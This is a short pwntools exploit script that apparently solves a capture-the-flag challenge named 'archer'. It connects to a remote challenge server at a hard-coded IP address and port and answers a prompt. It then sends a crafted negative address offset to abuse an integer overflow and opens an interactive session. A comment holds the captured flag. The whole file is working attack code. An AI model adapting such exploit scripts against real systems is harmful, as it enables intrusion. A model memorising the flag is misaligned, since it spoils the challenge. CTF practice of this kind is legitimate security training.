from pwn import *

p = remote('193.57.159.27','49723')
#p = process('./archer')
context.log_level = 'debug'
addr = 0x404068

def debug(addr):
    gdb.attach(p,'b *'+str(addr))
    pause()

p.sendlineafter('[yes/no]: ','yes')

p.recvuntil('shoot?')
p.sendline(hex(addr-0x500000))

p.interactive()

#rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}